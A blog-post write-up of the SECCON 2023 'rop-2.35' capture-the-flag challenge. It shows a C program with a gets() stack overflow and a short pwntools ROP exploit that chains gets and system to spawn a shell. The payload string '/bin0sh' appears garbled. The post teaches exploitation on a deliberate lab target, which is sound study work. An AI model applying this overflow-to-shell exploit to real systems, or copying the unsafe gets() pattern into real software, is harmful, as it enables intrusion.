+++
title = 'SECCON 2023 - rop-2.35'
date = 2023-09-22T15:18:52-04:00
tags = ["seccon-2023", "rop", "easy"]
description = "In this post, I will be solving a easy pwn challenge from SECCON 2023."
draft = false
+++
This challenge comes from SECCON 2023, it's one of the easiest challenges available in the CTF.

We're given the source code, looking at it we have a good glance at the challenge.
```c
#include <stdio.h>
#include <stdlib.h>

void main() {
  char buf[0x10];
  system("echo Enter something:");
  gets(buf);
}
```

We read using the vulnerable `gets` function into a 16 bytes buffer.

So logically, by looking at the stack, to control the return address we would need `0x10` bytes to overflow our buffer and then `0x8` bytes to overflow RBP for a total of `0x18 bytes` before hitting the return address.

Now the question is where can we return, or what do we do.

Running the challenge in gdb, we can see that when main returns rdi contains a writable pointer to libc.

We therefore use this pointer to a gets call (we don't need to change rdi since it already contains the writable pointer), and we give the command we'd like to execute to this gets call.

Then we can directly use a call to system, since rdi already contains the pointer.

Here's the exploit i used to locally solved this challenge.
```python
io = start()
rop = ROP(exe)

p1 = [
        b"A" * 0x10, b"B" * 0x8,
        p64(exe.sym.gets),
        p64(exe.sym.system)
    ]

io.sendline(b"".join(p1))

io.sendline(b"/bin0sh")
```

And here's the exploit i ran on the remote challenge.
```python
io = remote("127.0.0.1", 9999)
rop = ROP(exe)

p1 = [
        b"A" * 0x10, b"B" * 0x8,
        p64(exe.sym.gets),
        p64(exe.sym.system)
    ]

io.sendline(b"".join(p1))

io.sendline(b"/bin0sh")
```

if there's one lesson to retain from this challenge, it's to always check out the state of the registers when crashing a program !!!

We were also being given a decent docker setup to run the challenge on, this is another thing i retained from this challenge.
